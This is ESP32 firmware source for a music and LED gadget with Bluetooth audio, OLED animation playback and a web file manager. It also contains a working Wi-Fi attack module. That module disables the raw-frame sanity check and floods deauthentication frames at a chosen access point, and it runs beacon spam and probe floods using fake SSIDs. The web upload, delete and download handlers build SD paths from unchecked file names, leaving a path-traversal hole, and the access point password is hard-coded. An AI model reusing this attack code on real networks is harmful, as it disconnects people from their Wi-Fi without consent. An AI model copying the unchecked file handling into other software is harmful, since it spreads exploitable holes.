// ============================================================
//  SOUMYA Gadget v9.3 — with OLED Studio
//  Animation video -> 1-bit frames -> SD card -> OLED sync
// ============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>
#include <Update.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <FastLED.h>
#include <AudioFileSourceSD.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutput.h>
#include "esp32-hal-bt.h"

extern "C" {
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "esp_wifi.h"
}

#include "led_music_ui.h"
#include "file_ui.h"
#include "attacks_ui.h"
#include "anim_studio.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t,int32_t,int32_t){ return 0; }

#define OLED_SDA 21
#define OLED_SCL 22
#define OLED_ADDR 0x3C
#define SCR_W 128
#define SCR_H 64
#define PIN_SD_CS   5
#define PIN_SD_SCK  18
#define PIN_SD_MISO 19
#define PIN_SD_MOSI 23
#define PIN_LED_DATA 13
#define LED_MAX 144
#define PIN_STATUS_LED 12
#define STATUS_LED_COUNT 2

#define AP_SSID "ESP32-Gadget"
#define AP_PASS "88888888"
#define AP_CHANNEL 6
#define BT_NAME "SOUMYA-Music"
#define MUSIC_DIR "/music"
#define ANIM_DIR  "/anims"
#define RING_SIZE 8192
#define MAX_SONGS 32
#define UPDATE_FILE "/update/firmware.bin"

enum Mode : uint8_t {
    M_BOOT, M_MAIN, M_SONGS, M_PLAYER, M_PLAYER_ANIM,
    M_BT_MENU, M_BT_SCAN, M_BT_DEV,
    M_GAMES,
    M_LED_MENU, M_LED_FX, M_LED_MUS, M_LED_BRIGHT, M_LED_WIFI,
    M_FLASH_MENU, M_SETTINGS, M_INFO, M_WIFI_FILES,
    M_HIDDEN, M_WIFI_TOOLS, M_WIFI_AP_LIST, M_WIFI_ATK,
    M_BT_TOOLS, M_IR_MENU,
    M_ATTACK_RUN, M_IR_LEARN, M_IR_TX, M_IR_JAM
};

enum AttackMode : uint8_t { ATK_NONE, ATK_BEACON, ATK_DEAUTH, ATK_PROBE };

struct APRecord { char ssid[33]; char bssid[18]; int rssi; int channel; };

struct State {
    Mode mode = M_BOOT;
    int mainSel = 0, subSel = 0;
    int volume = 100;
    int ledBright = 150, ledCount = 60, curEffect = 1;
    int flashBright = 200, flashColor = 0, flashEffect = 0;
    bool flashOn = false;
    int batteryPct = 78;
    int songCount = 0, currentSong = -1;
    bool isPlaying = false;
    bool displaySleepEnabled = true;
} g;

Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
CRGB mainLeds[LED_MAX];
CRGB flashLeds[STATUS_LED_COUNT];
Preferences prefs;
WebServer ledServer(80);
static bool webRunning = false;

String songFiles[MAX_SONGS];
int songCount = 0;
static bool a2dpStarted = false;

static int16_t ringBuf[RING_SIZE];
static volatile int rbHead = 0, rbTail = 0;
static portMUX_TYPE rbMux = portMUX_INITIALIZER_UNLOCKED;
static volatile float gRMS = 0.0f;

static volatile bool a2dpConnected = false;
static volatile bool a2dpStreaming = false;
static volatile int  a2dpCbCount = 0;

struct BtDev { char name[32]; char mac[18]; int rssi; };
static BtDev btDevs[16];
static volatile int btDevCount = 0;
static volatile bool btScanning = false;
static int btSel = 0;
static int btConnectTarget = -1;
static unsigned long btConnectStart = 0;

static volatile bool atkRun = false;
static AttackMode atkMode = ATK_NONE;
static TaskHandle_t atkTask = nullptr;
static char atkSSID[33], atkBSSID[18];
static int atkChannel = 1;
static volatile int atkPkts = 0;

static APRecord aps[30];
static int apCount = 0;
static volatile bool scanInProgress = false;
static volatile bool scanReady = false;

static unsigned long lastActivity = 0;
static bool displayOff = false;
static int animFrame = 0;
static volatile int gSerialEv = -1;

// ═══ Animation player state ═══
static File    animFile;
static uint16_t animW = 128, animH = 64;
static uint16_t animFps = 15;
static uint32_t animFrames = 0;
static uint32_t animCurrentFrame = 0;
static unsigned long animStartMs = 0;
static unsigned long animLastFrameMs = 0;
static bool animActive = false;
static char animPath[64] = {0};

struct WebCmd {
    enum T : uint8_t {
        NONE, PLAY, NEXT, PREV, STOP,
        SET_EFFECT, SET_BRIGHT, SET_COUNT, SET_HUE,
        ATK_BEACON, ATK_PROBE, ATK_DEAUTH, ATK_STOP
    };
    T type;
    int arg;
    WebCmd() : type(NONE), arg(0) {}
    WebCmd(T t, int a = 0) : type(t), arg(a) {}
};
static QueueHandle_t cmdQueue = nullptr;

#define SMOOTH_RATE 16.0f
float smSel = 0, smScroll = 0;
uint8_t smScene = 255;
unsigned long smLastMs = 0;

float lerpf(float a, float b, float t){ return a + (b-a)*t; }
void smTick(uint8_t scene, float ts, float tsc){
    unsigned long now = millis();
    if (smScene != scene) { smSel = ts; smScroll = tsc; }
    else {
        float dt = (now - smLastMs) / 1000.0f;
        if (dt > 0.08f) dt = 0.08f;
        float k = 1.0f - expf(-SMOOTH_RATE * dt);
        smSel = lerpf(smSel, ts, k);
        smScroll = lerpf(smScroll, tsc, k);
    }
    smScene = scene; smLastMs = now;
}

static inline int rb_avail(){ return (rbHead - rbTail + RING_SIZE) % RING_SIZE; }

static void rb_push(int16_t L, int16_t R){
    portENTER_CRITICAL(&rbMux);
    int next = (rbHead + 2) % RING_SIZE;
    if (next != rbTail) {
        ringBuf[rbHead] = L;
        ringBuf[(rbHead+1) % RING_SIZE] = R;
        rbHead = next;
    }
    portEXIT_CRITICAL(&rbMux);
}

class AudioOutRB : public AudioOutput {
public:
    bool ConsumeSample(int16_t s[2]) override { rb_push(s[0], s[1]); return true; }
    bool begin() override { return true; }
    bool stop() override { return true; }
};

static int32_t a2d_data_cb(uint8_t* buf, int32_t len){
    a2dpCbCount++;
    int16_t* out = (int16_t*)buf;
    int frames = len / 4;
    int n = 0;
    portENTER_CRITICAL(&rbMux);
    int pairs = ((rbHead - rbTail + RING_SIZE) % RING_SIZE) / 2;
    n = (frames < pairs) ? frames : pairs;
    for (int i = 0; i < n; i++) {
        out[i*2]   = ringBuf[rbTail]; rbTail = (rbTail + 1) % RING_SIZE;
        out[i*2+1] = ringBuf[rbTail]; rbTail = (rbTail + 1) % RING_SIZE;
    }
    portEXIT_CRITICAL(&rbMux);
    if (n < frames) memset(&out[n*2], 0, (frames - n) * 4);

    int64_t sum = 0;
    for (int i = 0; i < n; i++) { int32_t s = out[i*2]; sum += (int64_t)s * s; }
    if (n > 0) gRMS = sqrtf((float)sum / n) / 32768.0f;
    return len;
}

static void a2d_conn_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t* param) {
    switch (event) {
        case ESP_A2D_CONNECTION_STATE_EVT: {
            uint8_t st = param->conn_stat.state;
            if (st == ESP_A2D_CONNECTION_STATE_CONNECTED) {
                a2dpConnected = true;
                Serial.println("[A2DP] CONNECTED");
                esp_err_t r = esp_a2d_media_ctrl(ESP_A2D_MEDIA_CTRL_START);
                Serial.printf("[A2DP] Media START: %d\n", r);
            } else if (st == ESP_A2D_CONNECTION_STATE_DISCONNECTED) {
                a2dpConnected = false;
                a2dpStreaming = false;
                Serial.println("[A2DP] DISCONNECTED");
            }
            break;
        }
        case ESP_A2D_AUDIO_STATE_EVT: {
            uint8_t st = param->audio_stat.state;
            if (st == ESP_A2D_AUDIO_STATE_STARTED) {
                a2dpStreaming = true;
                Serial.println("[A2DP] * STREAM STARTED *");
            } else if (st == ESP_A2D_AUDIO_STATE_STOPPED) {
                a2dpStreaming = false;
                Serial.println("[A2DP] Audio STOPPED");
            }
            break;
        }
        case ESP_A2D_AUDIO_CFG_EVT:
            Serial.println("[A2DP] Codec configured");
            break;
        default: break;
    }
}

static void bt_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
        char bda[18];
        sprintf(bda, "%02X:%02X:%02X:%02X:%02X:%02X",
            param->disc_res.bda[0], param->disc_res.bda[1],
            param->disc_res.bda[2], param->disc_res.bda[3],
            param->disc_res.bda[4], param->disc_res.bda[5]);
        char nm[32] = {0};
        int rssi = -70;
        for (int i = 0; i < param->disc_res.num_prop; i++) {
            if (param->disc_res.prop[i].type == ESP_BT_GAP_DEV_PROP_BDNAME) {
                int len = param->disc_res.prop[i].len;
                if (len > 31) len = 31;
                memcpy(nm, param->disc_res.prop[i].val, len);
                nm[len] = 0;
            } else if (param->disc_res.prop[i].type == ESP_BT_GAP_DEV_PROP_RSSI) {
                rssi = *(int8_t*)param->disc_res.prop[i].val;
            }
        }
        if (nm[0] == 0) strcpy(nm, "(unnamed)");
        for (int i = 0; i < btDevCount; i++)
            if (strcmp(btDevs[i].mac, bda) == 0) return;
        if (btDevCount < 16) {
            strncpy(btDevs[btDevCount].name, nm, 31); btDevs[btDevCount].name[31] = 0;
            strncpy(btDevs[btDevCount].mac, bda, 17); btDevs[btDevCount].mac[17] = 0;
            btDevs[btDevCount].rssi = rssi;
            btDevCount++;
            Serial.printf("[BT] %s [%s] %d dBm\n", nm, bda, rssi);
        }
    } else if (event == ESP_BT_GAP_DISC_STATE_CHANGED_EVT) {
        if (param->disc_st_chg.state == ESP_BT_GAP_DISCOVERY_STOPPED) {
            btScanning = false;
            Serial.println("[BT] Scan complete");
        }
    }
}

static AudioFileSource*  audioSrc = nullptr;
static AudioGeneratorMP3* audioMP3 = nullptr;
static AudioOutRB*       audioRB  = nullptr;

static int readBattery(){
    long s = 0;
    for (int i = 0; i < 10; i++) s += analogRead(34);
    float v = (s / 10.0f / 4095.0f) * 3.3f * 2.0f;
    if (v >= 4.15f) return 100;
    if (v <= 3.30f) return 0;
    return (int)((v - 3.30f) / (4.15f - 3.30f) * 100);
}

void loadSongs(){
    songCount = 0;
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    if (!dir || !dir.isDirectory()) return;
    File f = dir.openNextFile();
    while (f && songCount < MAX_SONGS) {
        String n = String(f.name());
        if (!f.isDirectory()) {
            String l = n; l.toLowerCase();
            if (l.endsWith(".mp3")) songFiles[songCount++] = String(MUSIC_DIR) + "/" + n;
        }
        f = dir.openNextFile();
    }
    dir.close();
    g.songCount = songCount;
}
String songName(int idx){
    if (idx < 0 || idx >= songCount) return "(none)";
    String p = songFiles[idx];
    int s = p.lastIndexOf('/');
    return s >= 0 ? p.substring(s+1) : p;
}

void ensureBT(){
    if (a2dpStarted) return;
    esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
    if (!btStart()) { Serial.println("[BT] btStart failed"); return; }
    delay(150);
    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED)
        esp_bluedroid_init();
    if (esp_bluedroid_get_status() != ESP_BLUEDROID_STATUS_ENABLED)
        esp_bluedroid_enable();
    esp_bt_dev_set_device_name(BT_NAME);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_bt_gap_register_callback(bt_gap_cb);
    esp_a2d_source_init();
    esp_a2d_register_callback(a2d_conn_cb);
    esp_a2d_source_register_data_callback(a2d_data_cb);
    delay(150);
    a2dpStarted = true;
    Serial.println("[BT] Stack ready");
}

// ═══ Animation player functions ═══
static bool animOpen(const char* path){
    if (animFile) animFile.close();
    animFile = SD.open(path, FILE_READ);
    if (!animFile) return false;
    uint8_t hdr[16];
    if (animFile.read(hdr, 16) != 16) { animFile.close(); return false; }
    if (hdr[0] != 'A' || hdr[1] != 'N' || hdr[2] != 'I' || hdr[3] != 'M') {
        animFile.close(); return false;
    }
    animW = hdr[4] | (hdr[5] << 8);
    animH = hdr[6] | (hdr[7] << 8);
    animFps = hdr[8] | (hdr[9] << 8);
    animFrames = hdr[10] | (hdr[11]<<8) | (hdr[12]<<16) | ((uint32_t)hdr[13]<<24);
    animCurrentFrame = 0;
    animStartMs = millis();
    animLastFrameMs = 0;
    animActive = true;
    strncpy(animPath, path, 63);
    Serial.printf("[ANIM] Opened %s  %dx%d @ %dfps  %u frames\n",
                  path, animW, animH, animFps, animFrames);
    return true;
}

static void animClose(){
    if (animFile) animFile.close();
    animActive = false;
    animPath[0] = 0;
}

static void animDrawFrame(uint32_t idx){
    if (!animFile || !animActive) return;
    if (idx >= animFrames) return;
    // Seek to frame
    uint32_t offset = 16 + idx * ((animW / 8) * animH);
    if (!animFile.seek(offset)) return;

    int bytesPerRow = animW / 8;
    uint8_t rowBuf[16];
    display.clearDisplay();
    for (int y = 0; y < animH && y < SCR_H; y++){
        if (animFile.read(rowBuf, bytesPerRow) != bytesPerRow) break;
        for (int x = 0; x < animW && x < SCR_W; x++){
            int byteIdx = x >> 3;
            int bit = 7 - (x & 7);
            if (rowBuf[byteIdx] & (1 << bit))
                display.drawPixel(x, y, WHITE);
        }
    }
}

static void animTick(){
    if (!animActive) return;
    unsigned long elapsed = millis() - animStartMs;
    uint32_t shouldBe = (elapsed * animFps) / 1000;
    if (shouldBe >= animFrames) {
        animClose();
        return;
    }
    // Only redraw if frame changed (avoid needless I2C)
    if (shouldBe != animCurrentFrame){
        animCurrentFrame = shouldBe;
        animDrawFrame(animCurrentFrame);
        display.display();
    }
}

// Find matching .anim for a song basename
static bool findAnimForSong(int songIdx){
    if (songIdx < 0 || songIdx >= songCount) return false;
    String sn = songName(songIdx);       // e.g. "Kesariya.mp3"
    int dot = sn.lastIndexOf('.');
    if (dot > 0) sn = sn.substring(0, dot);
    String p = String(ANIM_DIR) + "/" + sn + ".anim";
    return animOpen(p.c_str());
}

void stopSong(){
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    if (audioSrc) audioSrc->close();
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc;  audioSrc  = nullptr;
    g.isPlaying = false;
    rbHead = rbTail = 0;
    animClose();
}
void playSong(int idx){
    if (idx < 0 || idx >= songCount) return;
    stopSong(); delay(50);
    g.currentSong = idx;
    ensureBT();
    audioSrc = new AudioFileSourceSD(songFiles[idx].c_str());
    if (!audioSrc) return;
    audioMP3 = new AudioGeneratorMP3();
    if (!audioMP3) { delete audioSrc; audioSrc = nullptr; return; }
    if (audioMP3->begin(audioSrc, audioRB)) {
        g.isPlaying = true;
        // Try to load matching animation
        if (findAnimForSong(idx)) {
            g.mode = M_PLAYER_ANIM;
        } else {
            g.mode = M_PLAYER;
        }
    } else {
        stopSong();
    }
}
void nextSong(){ if (songCount) playSong((g.currentSong + 1) % songCount); }
void prevSong(){ if (songCount) playSong((g.currentSong - 1 + songCount) % songCount); }

static void startBtDiscovery() {
    if (btScanning) return;
    if (!a2dpStarted) ensureBT();
    btDevCount = 0;
    btSel = 0;
    esp_bt_gap_register_callback(bt_gap_cb);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 20, 0);
    btScanning = true;
    Serial.println("[BT] Discovery started");
}
static void stopBtDiscovery() {
    if (!btScanning) return;
    esp_bt_gap_cancel_discovery();
    btScanning = false;
}
static void btConnect(int idx) {
    if (idx < 0 || idx >= btDevCount) return;
    if (!a2dpStarted) ensureBT();
    btConnectTarget = idx;
    btConnectStart = millis();
    a2dpConnected = false;
    a2dpStreaming = false;

    uint8_t bda[6];
    unsigned int v[6];
    sscanf(btDevs[idx].mac, "%x:%x:%x:%x:%x:%x",
           &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
    for (int i = 0; i < 6; i++) bda[i] = (uint8_t)v[i];

    Serial.printf("[BT] Connecting to %s\n", btDevs[idx].name);
    esp_err_t r = esp_a2d_source_connect(bda);
    Serial.printf("[BT] Connect result: %d\n", r);
}

static int ledHue = 0;
static void updateLED(){
    static unsigned long last = 0;
    if (millis() - last < 30) return;
    last = millis();
    int n = g.ledCount;
    uint8_t bri = g.ledBright;
    uint8_t hue = ledHue;
    if (g.curEffect < 16) {
        switch (g.curEffect) {
            case 0: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, bri); break;
            case 1: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue + i * 256 / n, 255, bri); ledHue = (ledHue + 3) & 0xFF; break;
            case 2: { float b = (sinf(millis() / 1000.0f) + 1.0f) * 0.5f; for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, b * bri); break; }
            case 3: { fadeToBlackBy(mainLeds, n, 48); int p = (millis() / 40) % n; mainLeds[p] = CHSV(hue, 255, bri); break; }
            case 4: { fadeToBlackBy(mainLeds, n, 96); int p = (millis() / 30) % (n * 2); if (p < n) mainLeds[p] = CHSV(hue, 255, bri); break; }
            default: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, bri); break;
        }
    } else {
        float r = gRMS;
        if (r > 1.0f) r = 1.0f;
        uint8_t b = (uint8_t)constrain(20 + r * 235, 20, bri);
        uint8_t mh = hue + (uint8_t)(r * 128);
        int bars = (int)(r * n);
        int mode = g.curEffect - 16;
        for (int i = 0; i < n; i++) {
            switch (mode % 4) {
                case 0: mainLeds[i] = (i < bars) ? CHSV(mh, 255, b) : CRGB(0,0,0); break;
                case 1: { int mid = n/2; int d = abs(i - mid); mainLeds[i] = (d < bars/2) ? CHSV(mh, 255, b) : CRGB(0,0,0); break; }
                case 2: { int h = 2 + (int)(r * 14); mainLeds[i] = CHSV(mh, 255, (i % h == 0) ? b : (uint8_t)(b/4)); break; }
                case 3: mainLeds[i] = CHSV(mh + i * 4, 255, b); break;
            }
        }
    }
    FastLED.show();
}

static const uint8_t FC[7][3] = {{255,255,255},{255,0,0},{0,255,0},{0,0,255},{255,255,0},{0,255,255},{255,0,255}};
static void flashApply(){
    if (!g.flashOn) { for (int i = 0; i < STATUS_LED_COUNT; i++) flashLeds[i] = CRGB(0,0,0); }
    else {
        const uint8_t* c = FC[g.flashColor];
        uint8_t br = (uint32_t)g.flashBright * 255 / 100;
        CRGB col((uint32_t)c[0]*br/255, (uint32_t)c[1]*br/255, (uint32_t)c[2]*br/255);
        for (int i = 0; i < STATUS_LED_COUNT; i++) flashLeds[i] = col;
    }
    FastLED.show();
}
static void flashSet(bool on){ g.flashOn = on; flashApply(); }

static uint8_t deauthFrame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x07,0x00};

static bool parseMac(const char* s, uint8_t* o){
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) o[i] = (uint8_t)v[i];
    return true;
}
static int buildBeacon(uint8_t* b, int bLen, const char* ssid, int ch){
    int sl = strlen(ssid);
    if (sl > 32 || bLen < (38 + sl)) return 0;
    memset(b, 0, bLen);
    int i = 0;
    b[i++]=0x80; b[i++]=0x00; b[i++]=0x00; b[i++]=0x00;
    memset(b+i, 0xFF, 6); i += 6;
    uint8_t mac[6];
    for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
    mac[0] = (mac[0] | 0x02) & 0xFE;
    memcpy(b+i, mac, 6); i += 6;
    memcpy(b+i, mac, 6); i += 6;
    i += 2; memset(b+i, 0, 8); i += 8;
    b[i++]=0x64; b[i++]=0x00; b[i++]=0x31; b[i++]=0x04;
    b[i++]=0x00; b[i++]=(uint8_t)sl;
    memcpy(b+i, ssid, sl); i += sl;
    b[i++]=0x01; b[i++]=0x08;
    const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(b+i, r, 8); i += 8;
    b[i++]=0x03; b[i++]=0x01; b[i++]=(uint8_t)ch;
    return i;
}
static const char* FAKE[] = {
    "JioFiber_5G","Airtel_Xstream","TP-Link_2.4G","Netgear_Home",
    "Sharma_Home","Rahul_iPhone","Home_Sweet_Home","AndroidAP_1234",
    "iPhone_Hotspot","Redmi_Note12","Samsung_A54","Cafe_Coffee_Day",
    "Free_Public_WiFi","Guest_Network","Setup_Required"
};
#define FAKE_N (sizeof(FAKE)/sizeof(FAKE[0]))

static void attackWorker(void*){
    uint8_t bssid[6];
    parseMac(atkBSSID, bssid);
    atkPkts = 0;
    if (atkMode == ATK_BEACON) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[256];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                const char* s = FAKE[random(0, FAKE_N)];
                int l = buildBeacon(f, sizeof(f), s, ch);
                if (l > 0 && esp_wifi_80211_tx(WIFI_IF_STA, f, l, false) == ESP_OK) atkPkts++;
                vTaskDelay(1);
            }
        }
    } else if (atkMode == ATK_DEAUTH) {
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_channel(atkChannel, WIFI_SECOND_CHAN_NONE);
        uint8_t f[26];
        while (atkRun) {
            memcpy(f, deauthFrame, 26);
            memcpy(f+10, bssid, 6); memcpy(f+16, bssid, 6);
            for (int i = 0; i < 50 && atkRun; i++) {
                f[22] = i & 0xFF; f[23] = (i>>8) & 0xFF;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) atkPkts++;
            }
            vTaskDelay(30);
        }
    } else if (atkMode == ATK_PROBE) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[128];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                memset(f, 0, sizeof(f));
                int i = 0;
                f[i++]=0x40; f[i++]=0x00; f[i++]=0x00; f[i++]=0x00;
                memset(f+i, 0xFF, 6); i += 6;
                uint8_t m[6];
                for (int k = 0; k < 6; k++) m[k] = random(0, 256);
                m[0] = (m[0]|0x02)&0xFE;
                memcpy(f+i, m, 6); i += 6;
                memcpy(f+i, m, 6); i += 6;
                i += 2;
                const char* s = FAKE[random(0, FAKE_N)];
                int sl = strlen(s);
                f[i++]=0x00; f[i++]=(uint8_t)sl;
                memcpy(f+i, s, sl); i += sl;
                f[i++]=0x01; f[i++]=0x08;
                const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
                memcpy(f+i, r, 8); i += 8;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, i, false) == ESP_OK) atkPkts++;
                vTaskDelay(1);
            }
        }
    }
    WiFi.mode(WIFI_OFF);
    atkRun = false;
    atkMode = ATK_NONE;
    vTaskDelete(nullptr);
}
static void startBeacon(){
    if (atkRun) return;
    if (g.isPlaying) stopSong();
    atkMode = ATK_BEACON; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 1);
}
static void startProbe(){
    if (atkRun) return;
    if (g.isPlaying) stopSong();
    atkMode = ATK_PROBE; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 1);
}
static void startDeauth(int idx){
    if (atkRun || idx < 0 || idx >= apCount) return;
    if (g.isPlaying) stopSong();
    strncpy(atkSSID, aps[idx].ssid, 32); atkSSID[32]=0;
    strncpy(atkBSSID, aps[idx].bssid, 17); atkBSSID[17]=0;
    atkChannel = aps[idx].channel;
    atkMode = ATK_DEAUTH; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 8192, nullptr, 1, &atkTask, 1);
}
static void stopAttack(){ if (!atkRun) return; atkRun = false; delay(250); }

static void startAsyncScan(){
    if (scanInProgress) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(20);
    WiFi.scanNetworks(true, true);
    scanInProgress = true;
    scanReady = false;
}
static void pollScan(){
    if (!scanInProgress) return;
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return;
    if (n < 0) { scanInProgress = false; return; }
    apCount = min(n, 30);
    for (int i = 0; i < apCount; i++) {
        strncpy(aps[i].ssid, WiFi.SSID(i).c_str(), 32); aps[i].ssid[32]=0;
        strncpy(aps[i].bssid, WiFi.BSSIDstr(i).c_str(), 17); aps[i].bssid[17]=0;
        aps[i].rssi = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);
    }
    WiFi.scanDelete();
    scanInProgress = false;
    scanReady = true;
}

static bool checkAndFlashUpdate(){
    if (!SD.exists(UPDATE_FILE)) return false;
    File f = SD.open(UPDATE_FILE, FILE_READ);
    if (!f) return false;
    size_t size = f.size();
    Serial.printf("[OTA] Found %u bytes\n", (unsigned)size);
    if (size == 0 || size > 4 * 1024 * 1024) {
        f.close(); SD.remove(UPDATE_FILE);
        return false;
    }
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(6, 20); display.print("FIRMWARE UPDATE");
    display.setCursor(6, 34); display.print("Flashing...");
    display.setCursor(6, 46); display.print("Do not power off!");
    display.display();

    if (!Update.begin(size)) {
        f.close(); SD.remove(UPDATE_FILE);
        return false;
    }
    size_t written = 0;
    uint8_t buf[4096];
    while (f.available()) {
        size_t n = f.read(buf, sizeof(buf));
        if (Update.write(buf, n) != n) {
            Update.abort();
            f.close(); SD.remove(UPDATE_FILE);
            return false;
        }
        written += n;
        int pct = (int)((uint64_t)written * 100 / size);
        display.fillRect(6, 56, 116, 6, BLACK);
        display.drawRect(6, 56, 116, 6, WHITE);
        display.fillRect(7, 57, (pct * 114) / 100, 4, WHITE);
        display.display();
    }
    f.close();
    if (!Update.end(true)) { SD.remove(UPDATE_FILE); return false; }
    Serial.println("[OTA] Success! Rebooting...");
    delay(1500);
    SD.remove(UPDATE_FILE);
    ESP.restart();
    return true;
}

// ═══════════════════════════════════════════════════════════
//  Web handlers
// ═══════════════════════════════════════════════════════════
static void hLedRoot() { ledServer.send_P(200, "text/html", LED_MUSIC_HTML); }
static void hLedCmd(){
    if (ledServer.hasArg("effect"))     { WebCmd c(WebCmd::SET_EFFECT, ledServer.arg("effect").toInt());     xQueueSend(cmdQueue, &c, 0); }
    if (ledServer.hasArg("brightness")) { WebCmd c(WebCmd::SET_BRIGHT, ledServer.arg("brightness").toInt()); xQueueSend(cmdQueue, &c, 0); }
    if (ledServer.hasArg("count"))      { WebCmd c(WebCmd::SET_COUNT,  ledServer.arg("count").toInt());      xQueueSend(cmdQueue, &c, 0); }
    if (ledServer.hasArg("hue"))        { WebCmd c(WebCmd::SET_HUE,    ledServer.arg("hue").toInt());        xQueueSend(cmdQueue, &c, 0); }
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicCmd(){
    String a = ledServer.arg("action");
    if      (a == "play") { WebCmd c(WebCmd::PLAY, ledServer.arg("idx").toInt()); xQueueSend(cmdQueue, &c, 0); }
    else if (a == "next") { WebCmd c(WebCmd::NEXT); xQueueSend(cmdQueue, &c, 0); }
    else if (a == "prev") { WebCmd c(WebCmd::PREV); xQueueSend(cmdQueue, &c, 0); }
    else if (a == "stop") { WebCmd c(WebCmd::STOP); xQueueSend(cmdQueue, &c, 0); }
    else { ledServer.send(400, "text/plain", "bad"); return; }
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicList(){
    String j = "{\"songs\":[";
    for (int i = 0; i < songCount; i++) {
        if (i) j += ',';
        j += "{\"idx\":"; j += i; j += ",\"name\":\""; j += songName(i); j += "\"}";
    }
    j += "],\"current\":"; j += g.currentSong;
    j += ",\"playing\":"; j += (g.isPlaying ? "true" : "false");
    j += ",\"effect\":"; j += g.curEffect;
    j += ",\"bright\":"; j += g.ledBright;
    j += ",\"count\":";  j += g.ledCount;
    j += "}";
    ledServer.send(200, "application/json", j);
}
static void hFileRoot() { ledServer.send_P(200, "text/html", FILE_MANAGER_HTML); }
static void hFileList(){
    uint32_t totalMB = SD.totalBytes() >> 20;
    uint32_t freeMB  = (SD.totalBytes() - SD.usedBytes()) >> 20;
    String j = "{\"files\":[";
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) j += ',';
                j += "{\"name\":\""; j += String(f.name());
                j += "\",\"size\":"; j += (uint32_t)f.size(); j += "}";
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    j += "],\"totalMB\":"; j += totalMB;
    j += ",\"freeMB\":"; j += freeMB;
    j += "}";
    ledServer.send(200, "application/json", j);
}
static File _upF;
static void hFileUpload(){
    HTTPUpload& u = ledServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        String p = String(MUSIC_DIR) + "/" + u.filename;
        _upF = SD.open(p.c_str(), FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (_upF) _upF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (_upF) _upF.close();
        loadSongs();
    }
}
static void hFileDelete(){
    String n = ledServer.arg("name");
    if (n.length() == 0) { ledServer.send(400, "text/plain", "no name"); return; }
    String p = String(MUSIC_DIR) + "/" + n;
    if (SD.remove(p.c_str())) { loadSongs(); ledServer.send(200, "text/plain", "OK"); }
    else ledServer.send(500, "text/plain", "fail");
}
static void hFileDownload(){
    String n = ledServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    File f = SD.open(p.c_str(), FILE_READ);
    if (!f) { ledServer.send(404, "text/plain", "not found"); return; }
    ledServer.sendHeader("Content-Disposition", "attachment; filename=" + n);
    ledServer.streamFile(f, "audio/mpeg");
    f.close();
}
static void hAtkRoot() { ledServer.send_P(200, "text/html", ATTACKS_HTML); }
static void hAtkScan(){ startAsyncScan(); ledServer.send(200, "text/plain", "OK"); }
